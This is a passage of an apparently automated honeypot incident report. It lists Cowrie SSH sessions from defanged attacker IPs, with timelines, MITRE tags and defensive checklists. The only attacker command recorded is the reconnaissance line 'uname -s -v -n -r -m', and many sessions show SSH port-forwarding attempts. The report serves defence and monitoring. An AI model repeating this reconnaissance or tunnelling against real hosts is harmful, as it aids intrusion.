| `2026-08-08 07:04:09` | `cowrie.log.closed` |
| `2026-08-08 07:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8c1904dee3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:04 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:04:11` | `cowrie.session.connect` |
| `2026-08-08 07:04:11` | `cowrie.client.version` |
| `2026-08-08 07:04:11` | `cowrie.client.kex` |
| `2026-08-08 07:04:11` | `cowrie.login.success` |
| `2026-08-08 07:04:12` | `cowrie.session.params` |
| `2026-08-08 07:04:12` | `cowrie.command.input` |
| `2026-08-08 07:04:12` | `cowrie.log.closed` |
| `2026-08-08 07:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7978d1ae9462

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:04 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:04:15` | `cowrie.session.connect` |
| `2026-08-08 07:04:15` | `cowrie.client.version` |
| `2026-08-08 07:04:15` | `cowrie.client.kex` |
| `2026-08-08 07:04:16` | `cowrie.login.success` |
| `2026-08-08 07:04:17` | `cowrie.session.params` |
| `2026-08-08 07:04:17` | `cowrie.command.input` |
| `2026-08-08 07:04:17` | `cowrie.log.closed` |
| `2026-08-08 07:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ddee9788e2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:04 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:04:19` | `cowrie.session.connect` |
| `2026-08-08 07:04:19` | `cowrie.client.version` |
| `2026-08-08 07:04:19` | `cowrie.client.kex` |
| `2026-08-08 07:04:20` | `cowrie.login.success` |
| `2026-08-08 07:04:21` | `cowrie.session.params` |
| `2026-08-08 07:04:21` | `cowrie.command.input` |
| `2026-08-08 07:04:21` | `cowrie.log.closed` |
| `2026-08-08 07:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df7a73d302a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:04 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:04:23` | `cowrie.session.connect` |
| `2026-08-08 07:04:23` | `cowrie.client.version` |
| `2026-08-08 07:04:23` | `cowrie.client.kex` |
| `2026-08-08 07:04:24` | `cowrie.login.success` |
| `2026-08-08 07:04:24` | `cowrie.session.params` |
| `2026-08-08 07:04:24` | `cowrie.command.input` |
| `2026-08-08 07:04:25` | `cowrie.log.closed` |
| `2026-08-08 07:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97b5525af4f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:04 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:04:27` | `cowrie.session.connect` |
| `2026-08-08 07:04:27` | `cowrie.client.version` |
| `2026-08-08 07:04:27` | `cowrie.client.kex` |
| `2026-08-08 07:04:28` | `cowrie.login.success` |
| `2026-08-08 07:04:29` | `cowrie.session.params` |
| `2026-08-08 07:04:29` | `cowrie.command.input` |
| `2026-08-08 07:04:29` | `cowrie.log.closed` |
| `2026-08-08 07:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d86b61b067f3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:04 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:04:31` | `cowrie.session.connect` |
| `2026-08-08 07:04:32` | `cowrie.client.version` |
| `2026-08-08 07:04:32` | `cowrie.client.kex` |
| `2026-08-08 07:04:32` | `cowrie.login.success` |
| `2026-08-08 07:04:33` | `cowrie.session.params` |
| `2026-08-08 07:04:33` | `cowrie.command.input` |
| `2026-08-08 07:04:33` | `cowrie.log.closed` |
| `2026-08-08 07:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b34e4ca92d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:04 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:04:35` | `cowrie.session.connect` |
| `2026-08-08 07:04:35` | `cowrie.client.version` |
| `2026-08-08 07:04:36` | `cowrie.client.kex` |
| `2026-08-08 07:04:36` | `cowrie.login.success` |
| `2026-08-08 07:04:37` | `cowrie.session.params` |
| `2026-08-08 07:04:37` | `cowrie.command.input` |
| `2026-08-08 07:04:37` | `cowrie.log.closed` |
| `2026-08-08 07:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1762e01a19bf

| Field | Detail |
|---|---|
| **Source IP** | `122.170.99[.]195` |
| **First Seen** | 2026-08-08 07:09 |
| **Last Seen** | 2026-08-08 07:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:09:05` | `cowrie.session.connect` |
| `2026-08-08 07:09:06` | `cowrie.client.version` |
| `2026-08-08 07:09:06` | `cowrie.client.kex` |
| `2026-08-08 07:09:07` | `cowrie.login.success` |
| `2026-08-08 07:09:08` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.99[.]195` to AbuseIPDB if not already reported
- [ ] Block `122.170.99[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6028886545b9

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-08-08 07:09 |
| **Last Seen** | 2026-08-08 07:14 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:09:12` | `cowrie.session.connect` |
| `2026-08-08 07:09:13` | `cowrie.client.version` |
| `2026-08-08 07:09:13` | `cowrie.client.kex` |
| `2026-08-08 07:09:14` | `cowrie.login.success` |
| `2026-08-08 07:09:15` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62c338533949

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]109` |
| **First Seen** | 2026-08-08 07:09 |
| **Last Seen** | 2026-08-08 07:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:09:23` | `cowrie.session.connect` |
| `2026-08-08 07:09:24` | `cowrie.client.version` |
| `2026-08-08 07:09:24` | `cowrie.client.kex` |
| `2026-08-08 07:09:26` | `cowrie.login.success` |
| `2026-08-08 07:09:27` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]109` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21d1e17b175a

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]218` |
| **First Seen** | 2026-08-08 07:09 |
| **Last Seen** | 2026-08-08 07:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:09:36` | `cowrie.session.connect` |
| `2026-08-08 07:09:38` | `cowrie.client.version` |
| `2026-08-08 07:09:38` | `cowrie.client.kex` |
| `2026-08-08 07:09:39` | `cowrie.login.success` |
| `2026-08-08 07:09:40` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:09:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]218` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76db4f5ede7c

| Field | Detail |
|---|---|
| **Source IP** | `221.120.57[.]125` |
| **First Seen** | 2026-08-08 07:13 |
| **Last Seen** | 2026-08-08 07:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:13:08` | `cowrie.session.connect` |
| `2026-08-08 07:13:09` | `cowrie.client.version` |
| `2026-08-08 07:13:09` | `cowrie.client.kex` |
| `2026-08-08 07:13:11` | `cowrie.login.success` |
| `2026-08-08 07:13:11` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.57[.]125` to AbuseIPDB if not already reported
- [ ] Block `221.120.57[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dc568c7d98f

| Field | Detail |
|---|---|
| **Source IP** | `90.228.229[.]182` |
| **First Seen** | 2026-08-08 07:13 |
| **Last Seen** | 2026-08-08 07:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:13:16` | `cowrie.session.connect` |
| `2026-08-08 07:13:17` | `cowrie.client.version` |
| `2026-08-08 07:13:17` | `cowrie.client.kex` |
| `2026-08-08 07:13:17` | `cowrie.login.success` |
| `2026-08-08 07:13:18` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.228.229[.]182` to AbuseIPDB if not already reported
- [ ] Block `90.228.229[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d6e78edbe2c

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]157` |
| **First Seen** | 2026-08-08 07:17 |
| **Last Seen** | 2026-08-08 07:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:17:44` | `cowrie.session.connect` |
| `2026-08-08 07:17:45` | `cowrie.client.version` |
| `2026-08-08 07:17:45` | `cowrie.client.kex` |
| `2026-08-08 07:17:47` | `cowrie.login.success` |
| `2026-08-08 07:17:47` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]157` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-605a1880e4e4

| Field | Detail |
|---|---|
| **Source IP** | `116.7.248[.]50` |
| **First Seen** | 2026-08-08 07:18 |
| **Last Seen** | 2026-08-08 07:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:18:20` | `cowrie.session.connect` |
| `2026-08-08 07:18:20` | `cowrie.client.version` |
| `2026-08-08 07:18:20` | `cowrie.client.kex` |
| `2026-08-08 07:18:23` | `cowrie.login.success` |
| `2026-08-08 07:18:24` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.7.248[.]50` to AbuseIPDB if not already reported
- [ ] Block `116.7.248[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4eaab3b3fae

| Field | Detail |
|---|---|
| **Source IP** | `218.15.224[.]102` |
| **First Seen** | 2026-08-08 07:18 |
| **Last Seen** | 2026-08-08 07:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:18:31` | `cowrie.session.connect` |
| `2026-08-08 07:18:32` | `cowrie.client.version` |
| `2026-08-08 07:18:32` | `cowrie.client.kex` |
| `2026-08-08 07:18:35` | `cowrie.login.success` |
| `2026-08-08 07:18:36` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.15.224[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.15.224[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ddf966a4bfe

| Field | Detail |
|---|---|
| **Source IP** | `218.29.231[.]106` |
| **First Seen** | 2026-08-08 07:20 |
| **Last Seen** | 2026-08-08 07:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:20:57` | `cowrie.session.connect` |
| `2026-08-08 07:20:57` | `cowrie.client.version` |
| `2026-08-08 07:20:57` | `cowrie.client.kex` |
| `2026-08-08 07:20:59` | `cowrie.login.success` |
| `2026-08-08 07:21:00` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.231[.]106` to AbuseIPDB if not already reported
- [ ] Block `218.29.231[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278b2dd7e34c

| Field | Detail |
|---|---|
| **Source IP** | `117.177.235[.]249` |
| **First Seen** | 2026-08-08 07:21 |
| **Last Seen** | 2026-08-08 07:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:21:10` | `cowrie.session.connect` |
| `2026-08-08 07:21:11` | `cowrie.client.version` |
| `2026-08-08 07:21:11` | `cowrie.client.kex` |
| `2026-08-08 07:21:13` | `cowrie.login.success` |
| `2026-08-08 07:21:15` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.177.235[.]249` to AbuseIPDB if not already reported
- [ ] Block `117.177.235[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea3aad7e674f

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-08 07:33 |
| **Last Seen** | 2026-08-08 07:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:33:15` | `cowrie.session.connect` |
| `2026-08-08 07:33:16` | `cowrie.client.version` |
| `2026-08-08 07:33:16` | `cowrie.client.kex` |
| `2026-08-08 07:33:17` | `cowrie.login.success` |
| `2026-08-08 07:33:17` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fe61c96b026

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-08 07:38 |
| **Last Seen** | 2026-08-08 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:38:34` | `cowrie.session.connect` |
| `2026-08-08 07:38:34` | `cowrie.client.version` |
| `2026-08-08 07:38:34` | `cowrie.client.kex` |
| `2026-08-08 07:38:35` | `cowrie.login.success` |
| `2026-08-08 07:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee86d458a7de

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-08 07:38 |
| **Last Seen** | 2026-08-08 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:38:34` | `cowrie.session.connect` |
| `2026-08-08 07:38:34` | `cowrie.client.version` |
| `2026-08-08 07:38:34` | `cowrie.client.kex` |
| `2026-08-08 07:38:35` | `cowrie.login.success` |
| `2026-08-08 07:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d48a7504c49

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-08-08 07:40 |
| **Last Seen** | 2026-08-08 07:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:40:47` | `cowrie.session.connect` |
| `2026-08-08 07:40:49` | `cowrie.client.version` |
| `2026-08-08 07:40:49` | `cowrie.client.kex` |
| `2026-08-08 07:40:51` | `cowrie.login.success` |
| `2026-08-08 07:40:53` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3ed552d933e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]135` |
| **First Seen** | 2026-08-08 07:41 |
| **Last Seen** | 2026-08-08 07:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:41:02` | `cowrie.session.connect` |
| `2026-08-08 07:41:03` | `cowrie.client.version` |
| `2026-08-08 07:41:03` | `cowrie.client.kex` |
| `2026-08-08 07:41:04` | `cowrie.login.success` |
| `2026-08-08 07:41:04` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]135` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a86b2edb504

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-08-08 07:43 |
| **Last Seen** | 2026-08-08 07:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:43:42` | `cowrie.session.connect` |
| `2026-08-08 07:43:43` | `cowrie.client.version` |
| `2026-08-08 07:43:43` | `cowrie.client.kex` |
| `2026-08-08 07:43:45` | `cowrie.login.success` |
| `2026-08-08 07:43:46` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-563c6822cd00

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-08-08 07:44 |
| **Last Seen** | 2026-08-08 07:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:44:05` | `cowrie.session.connect` |
| `2026-08-08 07:44:06` | `cowrie.client.version` |
| `2026-08-08 07:44:06` | `cowrie.client.kex` |
| `2026-08-08 07:44:07` | `cowrie.login.success` |
| `2026-08-08 07:44:08` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:44:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593e9cf5f1b1

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]23` |
| **First Seen** | 2026-08-08 07:44 |
| **Last Seen** | 2026-08-08 07:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:44:17` | `cowrie.session.connect` |
| `2026-08-08 07:44:18` | `cowrie.client.version` |
| `2026-08-08 07:44:18` | `cowrie.client.kex` |
| `2026-08-08 07:44:20` | `cowrie.login.success` |
| `2026-08-08 07:44:21` | `cowrie.direct-tcpip.request` |
